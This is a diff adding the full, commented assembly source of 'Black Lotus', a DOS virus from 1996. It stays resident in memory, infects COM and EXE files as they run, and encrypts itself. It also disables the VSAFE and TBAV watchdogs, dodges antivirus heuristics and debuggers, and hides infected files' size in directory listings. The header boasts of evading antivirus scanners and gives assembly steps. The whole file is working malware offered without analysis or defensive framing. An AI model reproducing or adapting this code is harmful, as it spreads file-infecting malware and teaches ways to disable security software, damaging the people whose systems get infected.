@@ -1,0 +1,826 @@
+;Creator:  Killer Bee
+;Virus Name: 'Black Lotus'
+;
+; Features:
+;     * 64 bit xor File image encryption
+;     * 8 Bit xor Memory image encryption 
+;     * Dir stealth. (Thanks Qark!)
+;     * Infects Com and Exe on execution 4B00h.
+;     * TBdriver and TBMem disabler.
+;     * Vsafe disabler.
+;     * Well commented source code... yur look'n at it!
+;     * Does a good job of hiding from AVs.
+;
+;
+; Bugs: Dir Stealth doesn't work in Win95 dos box.  Actually no virus I know
+;       has a Dir stealth that will opperate from a Win95 dos box.  Win95 must
+;       be running the command.com from some API or the long file name
+;       function is somehow screwing things up.  But Dir Stealth works fine in
+;       native dos mode. Stealth is accomplished by hooking int 21 and
+;       watching 11h/12h and 4eh/4fh function calls.
+;
+;
+; TSR..................... Yes
+; Encrypted............... Yes  (File and Memory)
+; Appending Virus......... Yes  (of course)
+; Com infector............ Yes
+; Exe infector............ Yes
+; Ovl infector............ No
+; Sys infector............ No
+; Boot infector........... No
+; ReSet Attrib............ Yes                              
+; ReSet Time/Date......... Yes  (Put back as was found 'cept for seconds)
+; Avoid Heuristic......... Yes  (Stack, PSP verification)
+; Disable Watchdogs....... Yes  (VSAFE, TBDRIVER, TBMEM)
+; Targets Checksums....... No
+; Payload................. No   (Not nice to blow up computers!)
+; Message................. Yes  
+; Error trapping.......... Yes
+; Directory Stealth....... Yes  
+;
+;
+; Compile with A86 ver 4.01
+; Rename resulting .bin file to a .com... stir lightly and pour.
+
+VXSize =   heap-start
+TAG    =   2388h      ;use this so it won't re-infect files.
+                      ;Also the stack pointer of EXE 'fected files.
+                      ;Allows a virus of about 2000 bytes in size-heap.
+                      ;This VX is about 1100 bytes.. plenty of room left.
+                      ;Increase number as need for bigger VXs.. but take
+                      ;care!  TBSCAN flags if this number is too large.
+        org     0
+;********************* Memory is encrypted / File NOT encrypted *************
+start:                          ;                                           *
+        mov     bp, sp          ;trick to get 'flex offset' to enable       *
+        int     3               ;variables in someone else's .exe           *
+next:                           ;                                           *
+        mov     bp, ss:[bp-6]   ;---^                                       *
+        sub     bp, offset next ;--^                                        *
+                                ;                                           *
+        push    ds              ; put original ds on stack                  *
+        push    es              ; put original es on stack                  *
+                                ;                                           *
+;//////////////// My patented anti-heuristic routine \\\\\\\\\\\\\\\\\\\\\\\*
+        cmp     [0], 20CDh          ;PSP?                                   *
+        Je      PSP_OK              ;Yup all is ok.                         *
+        Jmp     $-9000              ;nope... Scanner alert!!!!              *
+PSP_OK:                             ;Try this with FV386 and see what       *
+                                    ;happens.                               *
+        Call    Encryption          ; Decrypt file image.                   *
+                                    ;                                       *
+;********************* Memory is encrypted / File NOT encrypted *************
+Estart:
+
+;\\\\\\\\\\\\\\\\ Use stack to test for program tracing ////////////////////
+        mov     ax, 0BADh      ;Our test number
+        push    ax             ;place it on stack
+        pop     ax             ;pop it off stack (moving the sp also)
+        dec     sp             ;now back up just for a second
+        dec     sp             ;
+        pop     bx             ;pop what's there. (bx 'should' = 0BAD)
+        cmp     ax,bx          ;Does it?
+        jne     DamnTracer     ;if not then we're being traced!!!
+        Jmp     short J0       ;stupid debuggers!
+DamnTracer:
+        Call    Encryption     ;This should screw 'em up good!
+J0:
+        mov     ax, 3069h               ; Installation check disguised as
+        int     21h                     ; Dos check version.
+        cmp     dx, 0F00Dh              ; Already installed? 'F00D'
+        je      done                    ; We're here already... so get out.
+
+;Only need to call TBMem disabler once just before going resident.
+;Once we are resident it doesn't matter what TBMem does then.
+
+        Call    TBKiller                ;Disable TBDriver.
+
+        Mov     ax, 0FA01h              ;put the sleepy watchdog to bed
+        mov     dx, 5945h               ; (vsafe disabler)
+        int     16h                     ;
+
+        mov     ax, ds                  ; point ax at psp
+        dec     ax                      ; ax now points at mcb
+        mov     ds, ax                  ; make ds = mcb segment
+
+        sub     word ptr ds:[3], (Endcode-start+15)/16+1
+        sub     word ptr ds:[12h], (Endcode-start+15)/16+1
+
+        mov     ax, ds:[12h]            ;ax= newMCB
+        mov     ds, ax                  ;ds= newMCB
+        inc     ax                      ;ax= newPSP
+        mov     es, ax                  ;ex= NewPSP
+        mov     byte ptr ds:[0], 'Z'     ;mark newMCB as last
+        mov     word ptr ds:[1], 8       ;mark newMCB as DOS
+        mov     word ptr ds:[3], (Endcode-start+15)/16  ;newMCB mem size
+                                                        ;in paragraphs
+
+        push    cs                         ;Getting ready to move resident.
+        pop     ds                         ;DS= code
+        xor     di, di                     ;di= where we going
+        mov     cx, (Heap-start)/2+1       ;size of VX to move
+        mov     si, bp                     ;si= what we gonna move
+        rep     movsw                      ;so move it then!
+
+  ;We are now resident
+        xor     ax, ax                   ;Get ready to hook some int's
+        mov     ds, ax                   ;ds=0.  IVT usually start here.
+        push    ds                       ;save ds on stack
+        lds     ax, ds:[21h*4]           ; Get Int 21 handler
+        mov     word ptr es:OldI21, ax   ; save orig Int 21 Off
+        mov     word ptr es:OldI21+2, ds ; save orig Int 21 Seg
+        pop     ds                       ; get ds back again
+        mov     word ptr ds:[21h*4], offset i21 ; Re-dir to our Int 21
+        mov     ds:[21h*4+2], es                ;
+
+;We are running underneath the loaded virus so ds and es will not equal
+;the cs when the memory encryption is done from here.
+        push    es            ;es-->
+        pop     ds            ;ds<--  (ds=es)
+        mov     ax, 0ABCDh    ;signal we are doing initial MemEnc
+        Call    MemEnc1       ;Encrypt the Memory image before exiting.
+
+done:
+        pop     es                              ;Get orig es
+        pop     ds                              ;Get orig ds
+        cmp     sp, TAG
+        jne     RestoreCOM                      ;Must be a com file
+
+RestoreEXE:
+        mov     ax, ds
+        add     ax, 10h                           ;ax=VX cs
+        add     cs:[bp+word ptr origCSIP+2], ax   ;add VX+Orig = Seg to Host
+        add     ax, cs:[bp+word ptr origSPSS]     ;ditto
+        cli                                       ;interrupts OFF
+        mov     ss, ax
+        mov     sp, cs:[bp+word ptr origSPSS+2]
+        sti                                       ;interrupts ON
+        db      0EAh                              ;jmp far too...
+origCSIP        dd      0fff00000h                ;... here.
+origSPSS        dd      ?
+
+RestoreCOM:
+        mov     di, 100h                   ;di=100 for copy of bytes
+        push    di                         ;needed for ret.
+        lea     si, [bp+offset ComByte]    ;point at the orginal bytes
+        movsw
+        movsb
+        ret               ;could've used jmp 100h and left off the push di
+
+TBKiller:
+        push    ds                      ;Fxxk TbDriver!
+        push    0000                    ;
+        pop     ds                      ;Start search at Seg 0000
+        push    ax                      ;Save the state
+        push    cx                      ;
+        push    si                      ;
+        MOV     CX,9000h                ;search top 36k (a lot!)
+        xor     si,si                   ;start at Offset 0--- top.
+        MOV     AX,05EBH                ;TbDriver's first part of signature
+L1:     CMP     AX,[SI]                 ;
+        JE      L3                      ;If found check for next part of sig
+L2:     INC     SI                      ;
+        LOOP    L1                      ;keep looking!
+                                        ;
+L3:     JNZ     GiveUp                  ;Must not be around.
+        CMP     BYTE PTR[SI+2],0EAH     ;Is it really TbDriver
+        JE      L4                      ;Yes it is!
+        JMP     short L2                ;No it aint.
+L4:
+        inc     si
+        mov     ds:[si b], 0                ;Gotcha!!
+GiveUp: pop     si                          ;Put data seg back like it was
+        pop     cx                          ;Restore the state
+        pop     ax                          ;
+        pop     ds                          ; 
+        ret
+
+   ;%%%%%%%%%%%%%%% Values the virus carries around %%%%%%%%%%%%%%%%%%%%%
+
+ComByte       db   0cdh,20h,0               ;First 3 Com bytes go here.
+AVFILES       db   'TBF-FVIBVSIMSCMSDE'
+NameVirus     db   'Black Lotus virus ver 2.0'
+Maker         db   'Created by: Killer Bee. '
+Dates         db   'Finished on 96-08-15'
+Message       db   "i'm losing ground "
+              db   "you know how this world can beat you down "
+              db   "i'm made of clay "
+              db   "i fear i'm the only one who thinks this way "
+              db   "i'm always falling down the same hill " 
+              db   "bamboo puncturing this skin "
+              db   "and nothing comes bleeding out of me just like a waterfall i'm drowning in "
+              db   "2 feet below the surface i can still make out your wavy face "
+              db   "and if i could just reach you maybe i could leave this place "
+              db   "i do not want this "
+              db   "i do not want this "
+              db   "don't you tell me how i feel "
+              db   "don't you tell me how i feel "
+              db   "you don't know just how i feel "
+              db   "i stay inside my bed"
+              db   "i have lived so many lives in my head "
+              db   "don't tell me that you care "
+              db   "there really isn't anything, is there? "
+              db   "you would know, wouldn't you? "
+              db   "you extend your hand to those who suffer "
+              db   "to those who know what it really feels like "
+              db   "to those who've had a taste "
+              db   "like that means something "
+              db   "and oh so sike i am "
+              db   "and maybe i don't have a choice "
+              db   "and maybe that is all i have "
+              db   "and maybe this is a cry for help "
+              db   "i do not want this "
+              db   "i do not want this "
+              db   "don't you tell me how i feel "
+              db   "don't you tell me how i feel "
+              db   "you don't know just how i feel "
+              db   "i want to know everything "
+              db   "i want to be everywhere "
+              db   "i want to fuck everyone in the world "
+              db   "i want to do something that matters."
+              db   "'i do not want this' NIN -trent reznor"
+
+;avoid TBav,F-prot,FVx86,IBm,VSafe/VShield,IM.exe,SCan,MSav.
+
+   ;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+;********************* Memory NOT encrypted / File is encrypted *************
+i24:                                                         ;              *
+        mov     al, 3                                        ;              *
+        iret                                                 ;              *
+                                                             ;              *
+; This is where all the GOOD stuff goes on at!                              *
+                                                             ;              *
+i21:                                                         ;              *
+        pushf
+        cmp     ax, 3069h   ;Was that a knock on my door?                   *
+        jz      VX_Check    ;Why yes it was!  Let him know we're home.      *
+                                                             ;              *
+;        cmp     ah, 0FBh                 ; testing only                     *
+        cmp     ah, 4Bh                 ; Someone executing?                *
+        jz      execute                 ; Yup.                              *
+                                                             ;              *
+        cmp     ah, 11h                 ;FCB find first                     *
+        jz      directory                                    ;              *
+        cmp     ah,  12h                ;FCB find next                      *
+        jz      directory                                    ;              *
+                                                             ;              *
+        cmp     ah, 4eh                 ;Find first                         *
+        jz      FindF_N                                      ;              *
+        cmp     ah, 4fh                 ;Find next                          *
+        jz      FindF_N                                      ;              *
+                                                             ;              *
+ ;Nothing happened that we care about so let Dos do it's thing              *
+                                                              ;             *
+return:                                                       ;             *
+        jmp     exitint21                                     ;             *
+                                                              ;             *
+Directory:                                                    ;             *
+        Call    MemEnc1    ;Decrypt memory                                  *
+        jmp     DirStealth                                    ;             *
+                                                              ;             *
+FindF_N:                                                      ;             *
+        Call    MemEnc1    ;Decrypt memory                                  *
+        popf               ;get off my stack!                 ;             *
+        Jmp     FirstNext                                     ;             *
+                                                              ;             *
+VX_Check:                                                     ;             *
+        mov     dx, 0F00Dh   ;replace it with our check.                    *
+        jmp     exitint21    ;let Int 21 finish the job.                    *
+                                                              ;             *
+                                                              ;             *
+execute:                                                      ;             *
+        Push ax      ;Save it to the stack                                  *
+        Push bx      ;for a clean return to                                 *
+        Push cx      ;the interrupt after virus is done                     *
+        Push dx      ;                                                      *
+        Push ds      ;                                                      *
+        Push es      ;                                                      *
+        Push di      ;                                                      *
+        Push si      ;                                                      *
+        Push bp      ;                                                      *
+        pushf
+                     ;                                                      *
+        Call MemEnc1    ;Decrypt memory                                     *
+                                                              ;             *
+;********************* Memory NOT encrypted / File is encrypted *************
+Execute1:
+
+;        call    TBKiller                ;make me happy!
+;removed to save time ^^^
+
+        push    dx
+        Mov     ax, 0FA01h              ;put the sleepy watchdog to bed
+        mov     dx, 5945h               ; (vsafe disabler)
+        int     16h                     ;
+        pop     dx
+
+        mov     word ptr Hostname, dx      ;save Seg:off of ASCIIZ filename
+        mov     word ptr Hostname+2, ds    ;
+        mov     bx, dx
+
+        xor     si, si                      ;Routine to help with finding
+ReadName:                                   ;out just who we're infecting
+        cmp     byte ptr [bx+si], '.'       ;and who not to infect.
+        je      NameEnd
+        inc     si
+        jmp     short ReadName
+NameEnd:
+        mov     di, si
+J5:
+        cmp     byte ptr [bx+di],'\'
+        je      NameBegin
+        dec     di
+        cmp     di, -1
+        je      NameBegin
+        jmp     short J5
+NameBegin:
+        inc     di
+
+;''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+;            Put checks for all the file names you want to avoid...
+;                             ...HERE
+;,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+        push    si
+        xor     si, si
+        mov     cl, 9                    ; 9 name checks.
+LO1:
+        mov     ax, CS:[offset AVFILES+si]
+        cmp     word ptr [bx+di], ax
+        jne     J1
+        pop     si
+        jmp     DoTheMem
+J1:
+        inc     si
+        inc     si
+        loop    LO1
+        pop     si
+
+        inc     si
+        add     bx,si
+        mov     word ptr Extname, bx      ;save Seg:off of ASCIIZ filename
+        mov     word ptr Extname+2, ds    ;
+
+        mov     ax, 3524h                     ;get Int 24
+        int     21h                           ;let dos do it
+        push    es                            ;save for the put back
+        push    bx                            ;ditto
+
+        push    ds                            ;ds==>
+        push    cs                            ;cs==>
+        pop     ds                            ;ds<==cs
+        mov     ax, 2524h                     ;re-dir to my Int 24
+        lea     dx, offset I24
+        int     21h
+        pop     ds                            ;ds<==ds
+
+        push    cs                            ;cs=>>  stack
+        pop     es                            ;es<<=cs
+
+        mov     ax, 4300h                     ;Get attributes
+        lds     dx, Hostname                  ;of this file
+        int     21h                           ;let dos doit
+        jc      LongReturn                    ; ...problem!
+
+        Jmp     Short J3
+LongReturn:
+        Jmp     Return1                       ;I hate chained jumps
+J3:
+
+        push    cx                            ;save attributes
+        push    ds                            ;save ptr to ASCIIZ filename
+        push    dx                            ;
+
+        mov     ax, 4301h                     ;clear attributes
+        xor     cx, cx
+        int     21h
+
+        mov     ax, 3D02h                     ;open for read/write
+        lds     dx, Hostname
+        int     21h
+        mov     bx, ax                        ;put handle in bx
+
+        push    cs                            ;cs-->
+        pop     ds                            ;ds<--
+
+        mov     ax, 5700h                     ;get file time/date
+        int     21h                           ;let dos do it
+        push    cx                            ;save 'em on stack
+        push    dx                            ;
+
+        mov     ah, 3Fh                       ;Read from file
+        mov     cx, 1Ch                       ;this many bytes
+        mov     dx, offset buffer             ;put it here.
+        int     21h                           ;let dos do it
+
+        mov     ax, 4202h                     ;Point to end of file
+        xor     cx, cx
+        xor     dx, dx
+        int     21h                           ;let dos do it
+                                              ;DX:AX = TRUE file size
+        mov     word ptr [HostSize+2], dx     ;save file size
+        mov     word ptr [HostSize], ax
+
+
+        cmp     word ptr [offset buffer], 'ZM' ; Exe file?
+        jz      CheckExe                       ; might be a com.
+
+        push    ds                             ;save ds
+        push    di
+        lds     di, ss:[ExtName]               ;get file extention
+        cmp     word ptr[di], 'OC'             ;is it a COm?
+        pop     di
+        pop     ds
+        jne     Jmp_close                      ;nope..
+
+        mov     cx, word ptr [offset buffer+1] ; jmp location
+        add     cx, Heap-start+3        ; convert to filesize
+        cmp     ax, cx                  ; equal if already infected
+        jz      jmp_close
+
+        cmp     ax, 65535-(Heap-start) ; check if too large
+        ja      jmp_close               ; Exit if so
+
+        cmp     ax, 1200                ; check if too small (bait)
+        jb      jmp_close               ; Exit if so
+
+        mov     di, offset ComByte
+        mov     si, offset buffer
+        movsw
+        movsb
+
+;ax = size of file. Sub 3 from size of file because of the jump and that is
+;offset to the end of the file.  put a jump in front of that and it jmps to
+;the end of file and to our code.
+
+        mov     cx, 0003h                           ;our jump size
+        sub     ax, cx                              ;take from ax
+        mov     word ptr [offset buffer+1], ax      ;offset to EOF mov to top
+        mov     dl, 00E9h                           ;coded jmp
+        mov     byte ptr [offset buffer], dl        ;move it in there
+        Call    KeyMe                               ;Make Key for encryption
+        jmp     ComInfect                           ;jmp past exe stuff
+
+CheckEXE:
+
+        cmp     word ptr [offset buffer+10h], tag ;We here?
+        je      Jmp_close                           
+        cmp     word ptr [offset buffer+1Ah], 0   ;Overlay??
+        jne     Jmp_close                           
+        cmp     byte ptr [offset buffer+18h],52h ; pklite'd?
+        je      Skipp       ;Pklite is ok by us!
+        cmp     byte ptr [offset buffer+18h],40h ; don't NE/PE
+        jge     Jmp_close   ;Must be a NE/PE exe. Bad news.
+
+        mov     ax, [buffer+04]              ;ax=num of 512 file pages
+        dec     ax                           ;last page isn't 512
+        mov     cx, 200h                     ;prep for mul by 512
+        mul     cx                           ;SLOW mul
+        mov     cx, [buffer+02]              ;cx=byte size of last page
+        add     ax, cx                       ;add last page size to ax
+                                             ;DX:AX = header stated file size
+        mov     cx, word ptr [HostSize+2]
+        cmp     cx, dx                       ;Head-Size match Size?
+        jne     Jmp_Close                    ;Must have internal overlay
+        mov     cx, word ptr [HostSize]
+        cmp     cx, ax                       ;Head-Size match Size?
+        jne     Jmp_Close                    ;Must have internal overlay
+
+        Jmp     short Skipp ;got this far all is well! Infect it!
+
+jmp_close:
+        jmp     close                            ; forget it.
+KeyMe:
+;^^^^^^^^^^^^^^^^^^^^^ Let's make a key ! ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+        push cx                         ; save regs we are about to use
+        push dx                         ;
+        push ax                         ;
+
+        mov     ah, 2ch                 ;use Get Time for Encrypt Value----+
+        int     21h                     ;    Sorta Random                  |
+        mov     word ptr EnValue, dx    ;dx= sec/hun     Eight (64)        |
+        mov     word ptr EnValue+2, cx  ;cx= hour/min        Digit (Bit)   |
+        add     dh, dl                  ;                        Key       |
+        add     dl, ah                  ;                                  |
+        mov     word ptr Envalue+4, dh  ;                                  |
+        mov     word ptr Envalue+5, dl  ;                                  |
+        sub     cl, dh                  ;                                  |
+        mov     word ptr Envalue+6, dh  ;                                  |
+        mov     word ptr Envalue+7, cl  ;----------------------------------+
+
+        pop  ax                         ; restore regs
+        pop  dx                         ;
+        pop  cx                         ;
+        ret                             ;
+;vvvvvvvvvvvvvvvvvvvvv Let's make a key! vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv
+skipp:
+        Call    KeyMe                         ;Make Key for encryption
+
+        lea     si, buffer+14h                ;
+        lea     di, origCSIP                  ;
+        movsw                                 ; Save original CS and IP
+        movsw                                 ;
+
+        sub     si, 0Ah                       ;
+        movsw                                 ; Save original SS and SP
+        movsw                                 ;
+
+        push    bx                            ; save file handle
+        mov     bx, word ptr [buffer+8]       ;Header size in 16 byte para's
+        mov     cl, 4
+        shl     bx, cl                        ; mul by 10h (16)
+
+        push    dx                            ; Save file size on the
+        push    ax                            ; stack
+
+        sub     ax, bx                        ; File size - Header size
+        sbb     dx, 0                         ; DX:AX - BX -> DX:AX
+
+        mov     cx, 10h
+        div     cx                            ; slow div!! by 10h (16)
+
+        mov     word ptr [buffer+16h], ax
+        Test    al, 1
+        jz      EvenStack        ; 'Proper' stacks have even segments
+        dec     ax                                         
+        Jmp     short OddStack
+EvenStack:
+        Inc     ax     ; don't want cs and ss to be the same
+        Inc     ax     ; TBAV flags it if they are.
+OddStack:
+
+        mov     word ptr [buffer+0Eh], ax
+        mov     word ptr [buffer+14h], dx
+        mov     word ptr [buffer+10h], tag
+
+        pop     ax                            ; Filelength in DX:AX
+        pop     dx
+
+        add     ax, Heap-start
+        adc     dx, 0
+
+        mov     cl, 9
+        push    ax
+        shr     ax, cl
+        ror     dx, cl
+        stc
+        adc     dx, ax
+        pop     ax
+        and     ah, 1
+
+        mov     word ptr [buffer+4], dx   ; Rework file size in the header
+        mov     word ptr [buffer+2], ax   ; ditto
+
+        pop     bx                            ; restore file handle
+
+ComInfect:
+;))))))))))))))))))) Move to buffer and encrypt it )))))))))))))))))))))))))
+        mov     si, offset Start
+        mov     cx, offset OpBuffer - offset Start
+        mov     di, offset OpBuffer
+        rep     movsb
+        mov     bp, offset OpBuffer - offset Start
+        Call    Encryption
+;((((((((((((((((((( Move to buffer and encrypt it (((((((((((((((((((((((((
+
+        mov     ah, 40h                              ; concatenate virus
+        mov     cx, Heap - start 
+        mov     dx, offset OpBuffer
+        int     21h                                  ;let dos do it
+
+        mov     ax, 4200h                     ;point to beginning of file
+        xor     cx, cx
+        cwd
+        int     21h                           ;let dos do it
+
+        mov     ah, 40h                       ;do the header
+        mov     cx, 1Ch
+        mov     dx, offset buffer
+        int     21h                           ;let dos do it
+
+close:
+        pop     dx                            ; get original date/time...
+        pop     cx                            ; ...off stack
+        mov     al,ch                         ;mov to al for tagging
+        and     al,1fh                        ;
+        and     cl,0e0h                       ;(used in stealthing)
+        or      cl,al                         ;
+        mov     ax, 5701h                     ;put this on the file
+        int     21h                           ;let dos do it
+
+        mov     ah, 3Eh                       ;close file (bx=handle)
+        int     21h                           ;let dos do it
+
+        mov     ax, 4301h                     ;Set attribute
+        pop     dx                            ;get file name back
+        pop     ds                            ;
+        pop     cx                            ;Attributes to set
+        int     21h
+
+Return1:
+        mov     ax, 2524h                     ; Put the error handler back.
+        pop     dx
+        pop     ds
+        int     21h
+
+
+;********************* Memory NOT encrypted / File is encrypted *************
+DotheMem:                                                     ;             *
+                                                              ;             *
+        Call MemEnc1    ;Encrypt memory                                     *
+        popf                                                      ;             *
+        Pop bp                                                ;             *
+        Pop si       ;Restore everything                      ;             *
+        Pop di                                                ;             *
+        Pop es                                                ;             *
+        Pop ds                                                ;             *
+        Pop dx                                                ;             *
+        Pop cx                                                ;             *
+        Pop bx                                                ;             *
+        Pop ax                                                ;             *
+                                                              ;             *
+exitint21:                                                    ;             *                                           
+                                                              ;             *
+        popf
+        db      0EAh                    ; Jump to original Int 21.          *
+OldI21  dd      ?                       ; seg:off of original Int 21.       *
+;********************* Memory NOT encrypted / File is encrypted *************
+
+DirStealth:
+
+        pushf
+        call    dword ptr cs:[oldi21]   ; call it
+
+        test    al,al                   ; Found what looking for?
+        jne     EscDir                  ; no so get out
+
+        push    es
+        push    ax                              ;Save whatcha change
+        push    bx
+        push    si
+
+        mov     ah,2fh                          ;Get DTA
+        pushf
+        call    dword ptr cs:[oldi21]   ; call it
+        xchg    si,bx
+
+        cmp     byte ptr es:[si],0ffh   ;is it Extended?
+        jne     IsntExtFCB
+
+        add     si,7                    ;Yup. Move it to drive byte
+
+IsntExtFCB:
+
+        mov     bx,word ptr es:[si+17h]         ;Move time.
+        and     bx,1f1fh
+        cmp     bl,bh
+        jne     DoneDir                        ;Is our marker set ?
+
+        sub     word ptr es:[si+1dh],offset Heap
+        sbb     word ptr es:[si+1fh],0
+
+DoneDir:
+        pop     si
+        pop     bx
+        pop     ax
+        pop     es
+;********************* Memory NOT encrypted / File is encrypted *************
+EscDir:                                                       ;             *
+                                                              ;             *
+        Call MemEnc1    ;Encrypt memory                                     *
+        popf                                                  ;             *
+        iret                                                  ;             *
+;********************* Memory NOT encrypted / File is encrypted *************
+
+FirstNext:
+        pushf
+        call    dword ptr cs:[oldi21]
+        jc      EscSearch
+
+        push    es                            ;Save whatcha change
+        push    bx
+        push    si
+
+        mov     ah,2fh
+        pushf
+        call    dword ptr cs:[oldi21]
+        xchg    si,bx
+
+        mov     bx,word ptr es:[si+16h]
+        and     bx,1f1fh
+        cmp     bl,bh
+        jne     DoneSearch                         ;Time set to us?
+
+        sub     word ptr es:[si+1ah],offset Heap
+        sbb     word ptr es:[si+1ch],0
+
+DoneSearch:
+        pop     si
+        pop     bx
+        pop     es
+        clc                             ;need to pass this back
+;********************* Memory NOT encrypted / File is encrypted *************
+EscSearch:                                                        ;         *
+        Call MemEnc1    ;Encrypt memory                                     *
+        retf     2                      ;don't pop flags                    *
+                                                                  ;         *
+MemEnc1:                                                          ;         *
+  pushf                                                           ;         *
+  cmp  ax, 0ABCDh                                                 ;         *
+  je   J10                                                        ;         *
+  push ds         ;      Make ds and es equal cs if                         *
+  push es          ;     we are resident in memory.                         *
+  push cs           ;    But if we are running from the host                *
+  push cs            ;   file we need ds to equal es and not                *
+  pop  es             ;  cs.                                                *
+  pop  ds              ;                                                    *
+                                                                  ;         *
+J10:                                                              ;         *
+  push ax                                                         ;         *
+  push cx                                                         ;         *
+  push si                                                         ;         *
+  push di                                                         ;         *
+                                                                  ;         *
+  push 7100h                                                      ;         *
+  push offset Heap                                                ;         *
+  push offset Encryption                                          ;         *
+                                                                  ;         *
+  push 9900h                                                      ;         *
+  push offset EscSearch                                           ;         *
+  push offset FirstNext                                           ;         *
+                                                                  ;         *
+  push 0CD00h                                                     ;         *
+  push offset EscDir                                              ;         *
+  push offset DirStealth                                          ;         *
+                                                                  ;         *
+  push 1200h                                                      ;         *
+  push offset DoTheMem                                            ;         *
+  push offset Execute1                                            ;         *
+                                                                  ;         *
+  push 6900h                                                      ;         *
+  push offset i24                                                 ;         *
+  push offset start                                               ;         *
+                                                                  ;         *
+J9:                                                               ;         *
+  pop  si              ;get start                                           *
+  pop  cx              ;get end                                             *
+  sub  cx, si          ;sub to get num of bytes                             *
+  pop  ax              ;xor value                                           *
+  mov  di, si          ;point at code to xor                                *
+                                                                  ;         *
+MLoop1:                                                           ;         *
+  lodsb                                                           ;         *
+  xor al, ah                                                      ;         *
+  stosb                                                           ;         *
+  loop MLoop1                                                     ;         *
+                                                                  ;         *
+  cmp  ah, 71h         ;finished?                                           *
+  jne J9                                                          ;         *
+                                                                  ;         *
+  pop di                                                          ;         *
+  pop si                                                          ;         *
+  pop cx                                                          ;         *
+  pop ax                                                          ;         *
+  cmp  ax, 0ABCDh                                                 ;         *
+  je   HostRun2                                                   ;         *
+  pop es                                                          ;         *
+  pop ds                                                          ;         *
+HostRun2:                                                         ;         *
+  popf                                                            ;         *
+  ret                                                             ;         *
+;********************* Memory NOT encrypted / File is encrypted *************
+
+;********************* Memory encrypted / File NOT encrypted ****************
+Encryption:                                                         ;       *
+  push  ax                                                          ;       *
+  push  dx                                                          ;       *
+  push  ds                                                          ;       *
+                                                                    ;       *
+  push  cs                                                          ;       *
+  pop   ds                                                          ;       *
+  xor   di, di                                                      ;       *
+  lea si, [bp+EStart]                                               ;       *
+  mov cx, offset Encryption - offset EStart                         ;       *
+EnDe:                                                               ;       *
+  mov ah, byte ptr si                                               ;       *
+  xor ah, ds:[bp+di+EnValue]                                        ;       *
+  mov byte ptr si, ah                                               ;       *
+  inc di                                                            ;       *
+  and di, 7                                                         ;       *
+  inc si                                                            ;       *
+  loop EnDe                                                         ;       *
+                                                                    ;       *
+  pop  ds                                                           ;       *
+  pop  dx                                                           ;       *
+  pop  ax                                                           ;       *
+  ret                                                               ;       *
+EnValue       db  8  dup   0    ; Encryption Value                  ;       *
+;********************* Memory encrypted / File NOT encrypted ****************
+
+Heap:
+Hostname      dd      0               ;Seg:Off to Host file name
+HostSize      dd      0               ;Seek-End size of Host file 
+Extname       dd      0               ;Seg:Off to Host file name
+buffer        db      1ch dup 0       ;buffer for exe-header
+OpBuffer      db      VXSize+64h dup 0;Opcode buffer for encryption and...
+Endcode:                              ;...doubles as a stack
